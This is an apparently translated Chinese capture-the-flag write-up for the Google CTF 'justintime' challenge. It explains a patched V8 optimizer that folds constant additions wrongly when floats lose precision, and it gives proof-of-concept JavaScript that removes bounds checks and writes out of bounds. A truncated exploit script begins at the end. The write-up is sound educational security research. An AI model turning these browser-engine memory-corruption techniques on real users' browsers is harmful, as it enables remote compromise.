# Google CTF justintime
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
文章可能有些部分写的不好,希望师傅们批评指正
## 0 环境搭建
具体的题目下载
解压之后得到上面的文件
打开chrome查看一下v8的版本
v8的版本是7.0.276.3
####  方法 1
刚开始想要使用git reset hard的方式还原,但是找不到对应版本的hash值,后来想到可以在下面的网站找
找到对应的hash值并还原
回退到相应的版本后,进行patch(题目下发的patch文件)
patch 这里遇到了一个问题,就是直接使用脚本patch不进去,所以手动将脚本中的代码贴到相应的文件中
使用ninja进行编译
####  方法 2
另外还在一个师傅的github上找到了编译好的debug 和 release版的v8 , 可以直接下载
**~~但是后期用这个版本调试的时候出现了点问题~~**
####  方法 3
同时也可以使用博客上的build.sh文件
简单分析一下build.sh文件
    fetch --nohooks chromium
    cd src
    build/install-build-deps.sh
    gclient runhooks
    # https://www.chromium.org/developers/how-tos/get-the-code/working-with-release-branches
    git fetch --tags
    git checkout tags/70.0.3538.9
    gclient sync
    gn gen out/Default
    echo  use_jumbo_build=true
    > enable_nacl=false
    > remove_webcore_debug_symbols=true
    > use_goma = true # for googlers
    > is_debug = false
    EOF
    gn args out/Default
    git apply ../attachments/nosandbox.patch
    pushd v8
    git apply ../attachments/addition-reducer.patch
    popd
    autoninja -C out/Default chrome
相关的build文件和patch文件可以从下面的链接下载
这里的build.sh需要根据自己的路径进行修改
上述的搭建过程可能要proxy
## 1 背景知识
####  1.0 v8 浮点数表示
参考:
v8用double表示浮点数
分为符号位S 指数位(EXP) 有效数位(Fraction) 分别为1位 11位 52位
浮点数所能表示的最大值就是将所有的有效数位填满, 一共是53位(转化方式如下图),1111……1 , 值为2^53 – 1 =
9007199254740991. 对应的浮点数0x433fffffffffffff
因为9007199254740991=11……1b（53位）=1.111……1b*2^52,指数位Exp=1023+52=1075=10000110011b，符号位S为0。
有效数位只有52位,当超过9007199254740991值时,比如9007199254740992,会在有效数位上加1导致溢出,失去精度,其二进制表示为1.0*2^53,由于只有52位,会舍弃最后的一个bit.
同理 参靠de4dcr0w的表格
图中红框里面的都会被舍弃
####  1.1 解题思路
本题给的是一个chrome,我们首先要找到其v8版本,进行调试,之后在攻击chrome
获取v8版本的方式,打开浏览器,地址栏输入chrome://version
## 2 漏洞分析
####  2.0 patch分析
题目中给了一个patch文件,引入了一些优化
本部分参考了 JeremyFetiveau师傅 sakura师傅 与 Nevv师傅的解释,三位师傅解释的很清楚了,膜拜一波,笔者本部分根据两者进行的理解
具体增加的函数代码如下
    Reduction DuplicateAdditionReducer::Reduce(Node* node) {
      switch (node->opcode()) {
        case IrOpcode::kNumberAdd:
          return ReduceAddition(node);
        default:
          return NoChange();
      }
    } 
    Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) {
      DCHECK_EQ(node->op()->ControlInputCount(), 0);
      DCHECK_EQ(node->op()->EffectInputCount(), 0);
      DCHECK_EQ(node->op()->ValueInputCount(), 2);
      Node* left = NodeProperties::GetValueInput(node, 0);
      if (left->opcode() != node->opcode()) {
        return NoChange(); // [1]
      }
      Node* right = NodeProperties::GetValueInput(node, 1);
      if (right->opcode() != IrOpcode::kNumberConstant) {
        return NoChange(); // [2]
      }
      Node* parent_left = NodeProperties::GetValueInput(left, 0);
      Node* parent_right = NodeProperties::GetValueInput(left, 1);
      if (parent_right->opcode() != IrOpcode::kNumberConstant) {
        return NoChange(); // [3]
      }
      double const1 = OpParameter(right->op());
      double const2 = OpParameter(parent_right->op());
      Node* new_const = graph()->NewNode(common()->NumberConstant(const1+const2));
      NodeProperties::ReplaceValueInput(node, parent_left, 0);
      NodeProperties::ReplaceValueInput(node, new_const, 1);
      return Changed(node); // [4]
    }
上面的增加的patch代码是在进行NumberAdd的时候产生的优化.我们有4个不同的代码路径(请阅读代码注释)。其中只有一个会导致节点更改。让我们画一个表示所有这些情况的模式。红色的节点表示它们不满足条件，导致返回NoChange。
case4表示的也就是 x+a+b ， a和b都是Number常量的情况.优化后，会把左边的 a 和 b 相加，相加后的结果替换原有 NumberAdd
右边的NumberConstant，
但是实际情况下
####  2.1 POC尝试与优化图解
首先针对上面的浮点数背景知识介绍做个test
这是因为有效数位的最后一位被忽视省略了,两个浮点数实际在内存中是一样的.
之后尝试写了一下POC
    function foo(x)
    {
        let a = [1.0,1.1,1.2,1.3,1.4];
        let temp = (x == 'oob') ? Number.MAX_SAFE_INTEGER+4 : Number.MAX_SAFE_INTEGER+1;
        let tmp = temp + 1 + 1;//trigger optimitisc 
        let idx = tmp - (Number.MAX_SAFE_INTEGER+1);
        return idx;
    }
    console.log(foo('oob'));
    console.log(foo(''));
    %OptimizeFunctionOnNextCall(foo);
    console.log(foo('oob'));
运行结果如下
可以看到最后输出了idx 为6 ,但是数组长度总共只有5, 看一下产生的优化图
这里可以看到右边的constant节点2
下面可以看到优化的时候,数组下标范围是(0,4),并且没有了checkbound节点
但是根据上面的POC,真正编译计算的时候却是可以到达下标6的,所以导致了数组溢出
sakura师傅的[POC](https://xz.aliyun.com/t/3348#toc-1)中对优化过程写的很清楚
    function foo(doit) {
        let a = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
        let x = doit ? 9007199254740992 : 9007199254740991-2;
        x += 1;
        // #29:NumberConstant[1]()  [Type: Range(1, 1)]
        // #30:SpeculativeNumberAdd[Number](#25:Phi, #29:NumberConstant, #26:Checkpoint, #23:Merge)  [Type: Range(9007199254740990, 9007199254740992)]
        x += 1;
        // #29:NumberConstant[1]()  [Type: Range(1, 1)]
        // #31:SpeculativeNumberAdd[Number](#30:SpeculativeNumberAdd, #29:NumberConstant, #30:SpeculativeNumberAdd, #23:Merge)  [Type: Range(9007199254740991, 9007199254740992)]
        x -= 9007199254740991;//解释:range(0,1);编译:(0,3);
        // #32:NumberConstant[9.0072e+15]()  [Type: Range(9007199254740991, 9007199254740991)]
        // #33:SpeculativeNumberSubtract[Number](#31:SpeculativeNumberAdd, #32:NumberConstant, #31:SpeculativeNumberAdd, #23:Merge)  [Type: Range(0, 1)]
        x *= 3;//解释:(0,3);编译:(0,9);
        // #34:NumberConstant[3]()  [Type: Range(3, 3)]
        // #35:SpeculativeNumberMultiply[Number](#33:SpeculativeNumberSubtract, #34:NumberConstant, #33:SpeculativeNumberSubtract, #23:Merge)  [Type: Range(0, 3)]
        x += 2;//解释:(2,5);编译:(2,11);
        // #36:NumberConstant[2]()  [Type: Range(2, 2)]
        // #37:SpeculativeNumberAdd[Number](#35:SpeculativeNumberMultiply, #36:NumberConstant, #35:SpeculativeNumberMultiply, #23:Merge)  [Type: Range(2, 5)]
        a[x] = 2.1729236899484e-311; // (1024).smi2f()
    }
    for (var i = 0; i < 100000; i++){
      foo(true);
    }
所以根据上面的分析,我们可以实现一个数组越界
## 3 尝试利用
####  3.0 改变数组大小导致越界
数组a 是越界数组
obj 和 ABUF是一会利用是用到的
根据数组length的位置,确定我们脚本中要修改的index
根据这个idx可以去调整上面脚本中idax的形成过程,加或者乘来达到修改数组大小的效果
修改数组大小的部分脚本如下
    /*************************************************************
     * File Name: m_exp.js
     * 
     * Created on: 
     * Author: 
     * 
     * Last Modified: 
     * Description: exp for just in time game in google ctf 2018 final 
    ************************************************************/
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }